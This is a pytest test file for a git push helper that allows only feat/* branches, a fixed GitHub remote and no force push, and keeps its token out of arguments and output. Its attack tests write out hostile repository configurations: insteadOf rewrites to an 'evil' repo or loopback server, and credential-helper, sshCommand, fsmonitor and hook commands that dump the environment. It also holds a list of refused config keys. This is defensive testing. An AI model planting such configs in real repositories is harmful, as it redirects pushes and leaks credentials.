"""git_push_feat: feat/* only, fixed remote, no force, token never leaks."""

from __future__ import annotations

import base64
import http.server
import os
import shutil
import subprocess
import threading
import types

import pytest

from gatekeeper import git_push
from gatekeeper.git_push import (
    FEAT_BRANCH_RE,
    REMOTE_URL,
    PushRefused,
    build_argv,
    fetch_argv,
    push_feat,
    redact,
    token_from_slot,
    unexpected_config,
)

TOKEN = "ghp_TESTTOKEN0123456789abcdefABCDEF0000"
REPO = "/repo"
GD = "/tmp/gk-push-x/push.git"


def slot(value=TOKEN):
    calls = []

    def resolve(name):
        calls.append(name)
        return value

    resolve.calls = calls
    return resolve


def _sub(argv):
    for word in ("init", "fetch", "config", "push"):
        if word in argv:
            return word
    return "?"


class FakeRunner:
    """Answers init/fetch/config like real git; the push step is scripted."""

    def __init__(self, returncode=0, stdout="", stderr="", exc=None, config=None,
                 fail_step=None):
        self.returncode, self.stdout, self.stderr, self.exc = returncode, stdout, stderr, exc
        self.config, self.fail_step = config, fail_step
        self.calls = []

    def __call__(self, argv, **kw):
        step = _sub(argv)
        call = types.SimpleNamespace(step=step, argv=list(argv), kw=kw)
        self.calls.append(call)
        if step == self.fail_step:
            return types.SimpleNamespace(returncode=128, stdout="", stderr="fatal: x\n")
        if step == "config":
            gd = argv[argv.index("--git-dir") + 1]
            listing = self.config if self.config is not None else (
                f"file:{gd}/config\tcore.repositoryformatversion\n"
                f"file:{gd}/config\tcore.filemode\nfile:{gd}/config\tcore.bare\n")
            return types.SimpleNamespace(returncode=0, stdout=listing, stderr="")
        if step != "push":
            return types.SimpleNamespace(returncode=0, stdout="", stderr="")
        env = kw["env"]
        askpass = env["GIT_ASKPASS"]
        with open(askpass) as fh:
            call.script = fh.read()
        call.user = subprocess.run([askpass, "Username for 'https://github.com': "],
                                   env=env, capture_output=True, text=True, check=True).stdout
        call.pw = subprocess.run([askpass, "Password for 'https://x@github.com': "],
                                 env=env, capture_output=True, text=True, check=True).stdout
        call.mode = os.stat(askpass).st_mode & 0o777
        call.dir_mode = os.stat(os.path.dirname(askpass)).st_mode & 0o777
        if self.exc is not None:
            raise self.exc
        return types.SimpleNamespace(returncode=self.returncode, stdout=self.stdout,
                                     stderr=self.stderr)

    @property
    def push(self):
        return [c for c in self.calls if c.step == "push"]


# ---------------------------------------------------------------- branch / argv

@pytest.mark.parametrize("branch", [
    "feat/x", "feat/benign-exit1", "feat/gkrepo-tools", "feat/a.b_c-1", "feat/" + "a" * 60,
])
def test_branch_allowed(branch):
    assert FEAT_BRANCH_RE.fullmatch(branch)


@pytest.mark.parametrize("branch", [
    "main", "master", "feat/", "feat/../main", "feat/a..b", "feat/x.lock", "+feat/x",
    "feat/x:main", "feat/x:refs/heads/main", "refs/heads/main", "refs/heads/feat/x",
    "feat/-x", "feat/.x", "feat/x.", "feat/a/b", "feat/X", "feat/x main", "feat/x\n",
    "fix/x", "feat/x@{1}", "", "feat/" + "a" * 61, " feat/x",
])
def test_branch_refused(branch):
    with pytest.raises(PushRefused):
        build_argv(branch, git_dir=GD)
    with pytest.raises(PushRefused):
        fetch_argv(branch, repo=REPO, git_dir=GD)


def test_push_argv_shape():
    argv = build_argv("feat/x", git_dir=GD, git="/usr/bin/git")
    assert argv[:3] == ["/usr/bin/git", "--git-dir", GD]
    assert "-C" not in argv  # never runs inside the source repo
    for opt in ("core.hooksPath=/dev/null", "credential.helper=", "protocol.allow=never",
                "protocol.https.allow=always", "http.followRedirects=false"):
        assert argv[argv.index(opt) - 1] == "-c"
    assert not any("file.allow" in a or "ssh.allow" in a for a in argv)
    assert argv[-2] == REMOTE_URL == "https://github.com/davidsteg/gatekeeper.git"
    assert argv[argv.index("push") + 1:] == ["--porcelain", "--no-verify", REMOTE_URL,
                                              "refs/heads/feat/x:refs/heads/feat/x"]
    for bad in ("--force", "-f", "--force-with-lease", "--mirror", "--all", "--tags",
                "--delete", "origin"):
        assert bad not in argv
    assert not any(a.startswith("+") for a in argv)


def test_fetch_argv_shape():
    argv = fetch_argv("feat/x", repo=REPO, git_dir=GD)
    assert argv[:3] == ["/usr/bin/git", "--git-dir", GD]
    assert "protocol.allow=never" in argv and "protocol.file.allow=always" in argv
    assert argv[-3:] == ["--", REPO, "refs/heads/feat/x:refs/heads/feat/x"]


# ---------------------------------------------------------------- slot value

@pytest.mark.parametrize("stored", [
    TOKEN, f"Bearer {TOKEN}", f"bearer {TOKEN}", f"token {TOKEN}", f"TOKEN {TOKEN}",
    f"  {TOKEN}\n", "github_pat_" + "A1b2" * 10,
])
def test_slot_forms_accepted(stored):
    assert token_from_slot(stored) == stored.split()[-1]


@pytest.mark.parametrize("stored", [
    f"Basic {TOKEN}",            # unknown scheme: never guess which word is the secret
    f"x-access-token {TOKEN}",
    f"{TOKEN} trailing",
    f"Bearer {TOKEN} extra",
    f"Bearer Bearer {TOKEN}",
    "Bearer short",              # not a GitHub token shape
    "ghp_with-dash-0123456789abcdef",
    "ghp_quote'0123456789abcdefabcd",
])
def test_slot_unknown_form_refused_without_echo(stored):
    run = FakeRunner()
    with pytest.raises(PushRefused) as ei:
        push_feat("feat/x", resolve_credential=slot(stored), repo=REPO, runner=run)
    assert run.calls == []
    assert TOKEN not in str(ei.value) and stored.split()[-1] not in str(ei.value)


@pytest.mark.parametrize("value", [None, "", "   ", "Bearer ", "token"])
def test_empty_slot_is_refused_without_running_git(value):
    run = FakeRunner()
    with pytest.raises(PushRefused) as ei:
        push_feat("feat/x", resolve_credential=slot(value), repo=REPO, runner=run)
    assert run.calls == []
    assert "empty" in str(ei.value)


# ---------------------------------------------------------------- flow (fake git)

def test_push_uses_slot_via_askpass_and_never_argv():
    run = FakeRunner(stdout="To https://github.com/davidsteg/gatekeeper.git\n*\trefs/heads/feat/x\n")
    resolve = slot()
    res = push_feat("feat/x", resolve_credential=resolve, repo=REPO, runner=run)
    assert res.outcome == "ok" and res.exit_code == 0
    assert resolve.calls == ["github"]
    assert [c.step for c in run.calls] == ["init", "fetch", "config", "push"]
    gd = run.calls[0].argv[-1]
    assert run.calls[1].argv[-2] == REPO
    for c in run.calls:
        assert not any(TOKEN in a for a in c.argv)
        assert c.kw["cwd"] == os.path.dirname(gd)
        assert c.argv[c.argv.index("--git-dir") + 1] == gd if c.step != "init" else True
    for c in run.calls[:3]:  # token only reaches the push child
        assert git_push.TOKEN_ENV not in c.kw["env"] and "GIT_ASKPASS" not in c.kw["env"]
        assert not any(TOKEN in v for v in c.kw["env"].values())
    call = run.push[0]
    assert TOKEN not in call.script
    assert call.user.strip() == "x-access-token"
    assert call.pw.strip() == TOKEN
    assert call.mode == 0o700 and call.dir_mode == 0o700
    env = call.kw["env"]
    assert env["GIT_TERMINAL_PROMPT"] == "0" and env["GIT_CONFIG_NOSYSTEM"] == "1"
    assert env["GIT_CONFIG_GLOBAL"] == "/dev/null" == env["GIT_CONFIG_SYSTEM"]
    assert [k for k, v in env.items() if TOKEN in v] == [git_push.TOKEN_ENV]
    assert not os.path.exists(env["GIT_ASKPASS"])  # temp dir removed afterwards
    assert TOKEN not in res.output


def test_parent_git_env_never_reaches_git(monkeypatch):
    for k, v in {"GIT_CONFIG_COUNT": "1", "GIT_CONFIG_KEY_0": "url.file:///evil.insteadOf",
                 "GIT_CONFIG_VALUE_0": REMOTE_URL, "GIT_CONFIG_PARAMETERS": "'a.b'='c'",
                 "GIT_DIR": "/evil", "GIT_SSH_COMMAND": "evil", "GIT_ASKPASS": "/evil",
                 "HOME": "/evil", "XDG_CONFIG_HOME": "/evil"}.items():
        monkeypatch.setenv(k, v)
    run = FakeRunner()
    push_feat("feat/x", resolve_credential=slot(), repo=REPO, runner=run)
    for c in run.calls:
        env = c.kw["env"]
        assert not any(k.startswith("GIT_CONFIG_") and k not in (
            "GIT_CONFIG_NOSYSTEM", "GIT_CONFIG_GLOBAL", "GIT_CONFIG_SYSTEM") for k in env)
        assert "GIT_DIR" not in env and "GIT_SSH_COMMAND" not in env
        assert "/evil" not in env.values()


@pytest.mark.parametrize("key", [
    "url.file:///evil.git.insteadof", "url.http://127.0.0.1:1/x.pushinsteadof",
    "include.path", "includeif.gitdir:/x.path", "http.proxy", "http.extraheader",
    "credential.helper", "core.sshcommand", "core.hookspath", "remote.origin.url",
    "core.fsmonitor", "protocol.allow",
])
def test_unexpected_push_config_refuses_before_token(key):
    cfg = f"file:{{gd}}/config\tcore.bare\nfile:{{gd}}/config\t{key}\n"

    class R(FakeRunner):
        def __call__(self, argv, **kw):
            if _sub(argv) == "config":
                self.config = cfg.format(gd=argv[argv.index("--git-dir") + 1])
            return super().__call__(argv, **kw)

    run = R()
    with pytest.raises(PushRefused) as ei:
        push_feat("feat/x", resolve_credential=slot(), repo=REPO, runner=run)
    assert run.push == []
    assert key in str(ei.value) and TOKEN not in str(ei.value)


def test_config_from_other_origin_is_refused():
    assert unexpected_config("file:/etc/gitconfig\tcore.bare\n", GD) == ["core.bare"]
    assert unexpected_config("command line:\tcore.bare\n", GD) == ["core.bare"]
    assert unexpected_config(f"file:{GD}/config\tcore.bare\n\n", GD) == []


@pytest.mark.parametrize("step", ["init", "fetch", "config"])
def test_preparation_failure_never_pushes(step):
    run = FakeRunner(fail_step=step)
    res = push_feat("feat/x", resolve_credential=slot(), repo=REPO, runner=run)
    assert res.outcome == "failed" and res.exit_code == 128
    assert run.push == [] and "not attempted" in res.output


def test_relative_repo_refused():
    with pytest.raises(PushRefused):
        push_feat("feat/x", resolve_credential=slot(), repo="repo", runner=FakeRunner())


def test_output_and_stderr_are_redacted():
    run = FakeRunner(returncode=128, stdout=f"out {TOKEN}\n",
                     stderr=f"fatal: https://x-access-token:{TOKEN}@github.com denied\n")
    res = push_feat("feat/x", resolve_credential=slot(), repo=REPO, runner=run)
    assert res.outcome == "failed" and res.exit_code == 128
    assert TOKEN not in res.output and "***" in res.output


def test_raw_slot_value_with_scheme_is_redacted_too():
    stored = f"Bearer {TOKEN}"
    run = FakeRunner(returncode=1, stderr=f"echo {stored}")
    res = push_feat("feat/x", resolve_credential=slot(stored), repo=REPO, runner=run)
    assert TOKEN not in res.output and stored not in res.output


def test_exception_text_is_redacted():
    run = FakeRunner(exc=OSError(f"boom {TOKEN}"))
    res = push_feat("feat/x", resolve_credential=slot(), repo=REPO, runner=run)
    assert res.outcome == "failed" and res.exit_code is None
    assert TOKEN not in res.output and "OSError" in res.output


def test_timeout_is_unknown_and_redacted():
    exc = subprocess.TimeoutExpired(["git"], 60, output=f"partial {TOKEN}".encode(),
                                    stderr=TOKEN)
    run = FakeRunner(exc=exc)
    res = push_feat("feat/x", resolve_credential=slot(), repo=REPO, runner=run)
    assert res.outcome == "unknown" and res.exit_code is None
    assert TOKEN not in res.output


def test_bad_branch_refused_before_slot_is_read():
    resolve = slot()
    with pytest.raises(PushRefused) as ei:
        push_feat("main", resolve_credential=resolve, repo=REPO, runner=FakeRunner())
    assert resolve.calls == []
    assert TOKEN not in str(ei.value)


def test_redact_helper():
    assert redact(f"a {TOKEN} b {TOKEN}", [TOKEN]) == "a *** b ***"
    assert redact("abc", ["", None, "ab"]) == "abc"  # too-short secrets are not masked


# ---------------------------------------------------------------- real git: attacks
# Reproduce t_28694f51: config the source repo carries must never move the
# push (or the token) to another target. Needs a git binary; without network
# the real push to github.com simply fails, which is fine -- the assertions
# are about where it did NOT go.

GIT = shutil.which("git")
needs_git = pytest.mark.skipif(GIT is None, reason="git binary not available")


def _git(*args, cwd=None):
    env = {"PATH": "/usr/bin:/bin", "HOME": "/nonexistent", "GIT_CONFIG_NOSYSTEM": "1",
           "GIT_CONFIG_GLOBAL": "/dev/null"}
    return subprocess.run([GIT, *args], cwd=cwd, env=env, capture_output=True, text=True,
                          check=True).stdout


@pytest.fixture
def world(tmp_path):
    repo, evil = tmp_path / "repo", tmp_path / "evil.git"
    _git("init", "-q", "-b", "feat/x", str(repo))
    _git("init", "-q", "--bare", str(evil))
    _git("-C", str(repo), "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q",
         "--allow-empty", "-m", "x")
    w = types.SimpleNamespace(tmp=tmp_path, repo=str(repo), evil=str(evil), calls=[])

    def cfg(key, value):
        _git("-C", w.repo, "config", key, value)

    def evil_refs():
        return _git("--git-dir", w.evil, "for-each-ref").strip()

    def spy(argv, **kw):
        w.calls.append(types.SimpleNamespace(argv=list(argv), env=dict(kw["env"])))
        return subprocess.run(argv, **kw)

    def push():
        return push_feat("feat/x", resolve_credential=slot(), repo=w.repo, git=GIT,
                         runner=spy, timeout_seconds=30)

    w.cfg, w.evil_refs, w.push = cfg, evil_refs, push
    return w


@pytest.fixture
def loopback():
    seen = []

    class H(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            seen.append((self.path, self.headers.get("Authorization")))
            if self.headers.get("Authorization"):
                self.send_response(403)
            else:
                self.send_response(401)
                self.send_header("WWW-Authenticate", "Basic realm=x")
            self.end_headers()

        do_POST = do_GET

        def log_message(self, *a):
            pass

    srv = http.server.HTTPServer(("127.0.0.1", 0), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    yield types.SimpleNamespace(url=f"http://127.0.0.1:{srv.server_address[1]}/x.git", seen=seen)
    srv.shutdown()


def _token_seen(seen):
    for _, auth in seen:
        if auth and TOKEN in base64.b64decode(auth.split()[-1]).decode(errors="replace"):
            return True
    return False


@needs_git
@pytest.mark.parametrize("kind", ["insteadOf", "pushInsteadOf"])
def test_attack_repo_insteadof_to_file_bare(world, kind):
    world.cfg(f"url.file://{world.evil}.{kind}", REMOTE_URL)
    res = world.push()
    assert world.evil_refs() == "", "push landed in the attacker's bare repo"
    assert TOKEN not in res.output


@needs_git
@pytest.mark.parametrize("kind", ["insteadOf", "pushInsteadOf"])
def test_attack_repo_insteadof_to_http_loopback(world, loopback, kind):
    world.cfg(f"url.{loopback.url}.{kind}", REMOTE_URL)
    res = world.push()
    assert not _token_seen(loopback.seen), "token was sent to the loopback server"
    assert loopback.seen == []
    assert TOKEN not in res.output


@needs_git
def test_attack_include_path(world, loopback):
    inc = world.tmp / "inc.cfg"
    inc.write_text(f'[url "file://{world.evil}"]\n\tinsteadOf = {REMOTE_URL}\n'
                   f'[url "{loopback.url}"]\n\tpushInsteadOf = {REMOTE_URL}\n')
    world.cfg("include.path", str(inc))
    world.push()
    assert world.evil_refs() == "" and loopback.seen == []


@needs_git
def test_attack_credential_helper(world):
    marker = world.tmp / "helper-ran"
    world.cfg("credential.helper", f"!f() {{ env > {marker}; }}; f")
    world.cfg("credential.https://github.com.helper", f"!f() {{ env > {marker}; }}; f")
    world.push()
    assert not marker.exists()


@needs_git
def test_attack_core_sshcommand(world):
    marker = world.tmp / "ssh-ran"
    world.cfg("core.sshCommand", f"sh -c 'env > {marker}' --")
    world.cfg("url.ssh://evil.invalid/x.git.insteadOf", REMOTE_URL)
    world.push()
    assert not marker.exists(), "core.sshCommand from the repo ran (with the token in env)"


@needs_git
def test_attack_hooks_and_fsmonitor(world):
    marker = world.tmp / "hook-ran"
    hook = os.path.join(world.repo, ".git", "hooks", "pre-push")
    with open(hook, "w") as fh:
        fh.write(f"#!/bin/sh\nenv > {marker}\nexit 1\n")
    os.chmod(hook, 0o755)
    world.cfg("core.fsmonitor", f"sh -c 'env > {marker}'")
    world.push()
    assert not marker.exists()


@needs_git
def test_attack_parent_git_config_env(world, loopback, monkeypatch):
    monkeypatch.setenv("GIT_CONFIG_COUNT", "2")
    monkeypatch.setenv("GIT_CONFIG_KEY_0", f"url.file://{world.evil}.insteadOf")
    monkeypatch.setenv("GIT_CONFIG_VALUE_0", REMOTE_URL)
    monkeypatch.setenv("GIT_CONFIG_KEY_1", f"url.{loopback.url}.pushInsteadOf")
    monkeypatch.setenv("GIT_CONFIG_VALUE_1", REMOTE_URL)
    monkeypatch.setenv("GIT_CONFIG_PARAMETERS", f"'url.file://{world.evil}.insteadof'='{REMOTE_URL}'")
    world.push()
    assert world.evil_refs() == "" and loopback.seen == []


@needs_git
def test_real_git_prepares_branch_and_only_push_sees_token(world):
    want = _git("-C", world.repo, "rev-parse", "refs/heads/feat/x").strip()
    world.cfg(f"url.file://{world.evil}.insteadOf", REMOTE_URL)
    got = {}

    def spy(argv, **kw):
        if "push" in argv:
            gd = argv[argv.index("--git-dir") + 1]
            got["sha"] = _git("--git-dir", gd, "rev-parse", "refs/heads/feat/x").strip()
            got["config"] = _git("--git-dir", gd, "config", "--list", "--name-only")
            got["env"] = kw["env"]
        else:
            got.setdefault("pre_envs", []).append(kw["env"])
        return subprocess.run(argv, **kw)

    res = push_feat("feat/x", resolve_credential=slot(), repo=world.repo, git=GIT,
                    runner=spy, timeout_seconds=30)
    assert got["sha"] == want  # the branch was fetched into the private GIT_DIR
    assert "url." not in got["config"]
    assert got["env"][git_push.TOKEN_ENV] == TOKEN
    assert all(git_push.TOKEN_ENV not in e for e in got["pre_envs"])
    assert world.evil_refs() == ""
    assert res.outcome in ("failed", "ok") and TOKEN not in res.output
